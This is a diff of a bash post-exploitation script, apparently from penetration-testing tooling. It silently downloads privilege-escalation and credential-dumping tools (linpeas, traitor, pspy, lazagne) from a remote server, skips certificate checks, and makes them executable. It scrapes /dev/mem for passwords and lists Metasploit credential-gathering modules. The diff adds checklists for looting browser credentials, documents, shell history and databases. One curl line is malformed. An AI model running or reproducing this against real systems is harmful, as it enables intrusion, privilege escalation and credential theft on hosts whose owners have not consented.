@@ -3,11 +3,9 @@
 while getopts "elu:" OPTION; do
     case $OPTION in
     e)
-        echo "ESCALATION START"
         escalation_on=1
         ;;
     l)
-        echo "LOOTING START"
         looting_on=1
         ;;
     u)
@@ -53,38 +51,38 @@ download_tools() {
     cd blood || exit
     if [ "$wget_found" == 1 ]
     then
-        wget --no-check-certificate "$server_url/tools/linpeas.sh"
-        wget --no-check-certificate "$server_url/tools/les.sh"
-        wget --no-check-certificate "$server_url/tools/nmap.zip"
+        wget --no-check-certificate -q "$server_url/tools/linpeas.sh"
+        wget --no-check-certificate -q "$server_url/tools/les.sh"
+        wget --no-check-certificate -q "$server_url/tools/nmap.zip"
         if [ "$kernel_arch" == "x86_64" ] || [ "$kernel_arch" == "x64" ]
         then
-            wget --no-check-certificate "$server_url/tools/traitor-amd64"
-            wget --no-check-certificate "$server_url/tools/pspy64"
-            wget --no-check-certificate "$server_url/tools/lazagne64"
+            wget --no-check-certificate -q "$server_url/tools/traitor-amd64"
+            wget --no-check-certificate -q "$server_url/tools/pspy64"
+            wget --no-check-certificate -q "$server_url/tools/lazagne64"
         else
-            wget --no-check-certificate "$server_url/tools/traitor-386"
-            wget --no-check-certificate "$server_url/tools/pspy32"
-            wget --no-check-certificate "$server_url/tools/lazagne32"
+            wget --no-check-certificate -q "$server_url/tools/traitor-386"
+            wget --no-check-certificate -q "$server_url/tools/pspy32"
+            wget --no-check-certificate -q "$server_url/tools/lazagne32"
         fi
     elif [ "$curl_found" == 1 ]
     then
-        curl -k "$server_url/tools/linpeas.sh" -o linpeas.sh
-        curl -k "$server_url/tools/les.sh" -o les.sh
-        curl -k "$server_url/tools/nmap.zip" -o nmap.zip
+        curl -s -k "$server_url/tools/linpeas.sh" -o linpeas.sh
+        curl -s -k "$server_url/tools/les.sh" -o les.sh
+        curl -s -k "$server_url/tools/nmap.zip" -o nmap.zip
         if [ "$kernel_arch" == "x86_64" ] || [ "$kernel_arch" == "x64" ]
         then
-            curl -k "$server_url/tools/traitor-amd64" -o pspy64 traitor-amd64
-            curl -k "$server_url/tools/pspy64" -o pspy64
-            curl -k "$server_url/tools/lazagne64" -o lazagne64
+            curl -s -k "$server_url/tools/traitor-amd64" -o pspy64 traitor-amd64
+            curl -s -k "$server_url/tools/pspy64" -o pspy64
+            curl -s -k "$server_url/tools/lazagne64" -o lazagne64
         else
-            curl -k "$server_url/tools/traitor-386" -o traitor-386
-            curl -k "$server_url/tools/pspy32" -o pspy32
-            curl -k "$server_url/tools/lazagne32" -o lazagne32
+            curl -s -k "$server_url/tools/traitor-386" -o traitor-386
+            curl -s -k "$server_url/tools/pspy32" -o pspy32
+            curl -s -k "$server_url/tools/lazagne32" -o lazagne32
         fi
     fi
-    unzip nmap.zip
+    unzip -qq nmap.zip
+    chmod +x linpeas.sh les.sh traitor* pspy* lazagne*
 }
-
 
 looting() {
     cd loot
@@ -133,7 +131,11 @@ run post/multi/gather/netrc_creds
 run post/multi/gather/remmina_creds
 run post/multi/gather/pgpass_creds
 run post/multi/gather/rsyncd_creds
-run post/multi/gather/ssh_creds"
+run post/multi/gather/ssh_creds
+======================= ADDITIONAL MANUAL CHECKS & DOUBLE CHECKS:
+[*] BROWSER
+[*] DATABASES
+[*] USERS'S FILES"
     echo "======================= CREDS IN MEMORY - it will take a moment ..." | tee -a loot/creds_in_memory.txt
     strings /dev/mem -n10 | grep --color=always -ie "PASSWORD|PASSWD" | tee -a loot/creds_in_memory.txt
 }
@@ -145,15 +147,30 @@ escalation() {
     ./les.sh | tee -a priv/les.txt
     ./traitor* | tee -a priv/traitor.txt
     echo "======================= ADDITIONAL MSF MODULES - DO NOT FORGET:
-    run post/linux/gather/enum_system
-    run post/linux/gather/enum_configs
-    run post/linux/gather/enum_users_history"
+run post/linux/gather/enum_system
+run post/linux/gather/enum_configs
+run post/linux/gather/enum_users_history
+======================= ADDITIONAL MANUAL CHECKS & DOUBLE CHECKS:
+[*] BROWSER:
+    - Browser History
+    - Bookmarks
+    - Download History
+    - Credentials
+    - Proxies
+    - Plugins/Extensions
+[*] INTRESTING DOCUMENTS:
+    - /home/<user>
+    - .doc
+    - .xls
+    - .bash_history
+    - .bashrc
+[*] DATABASES
+[*] INTERNAL PORT SCANNING
+[*] PORT FORWARDING"
     ./pspy* | tee -a priv/pspy.txt
 }
 
-
 download_tools
-
 if [ $escalation_on == 1 ]
 then 
     escalation
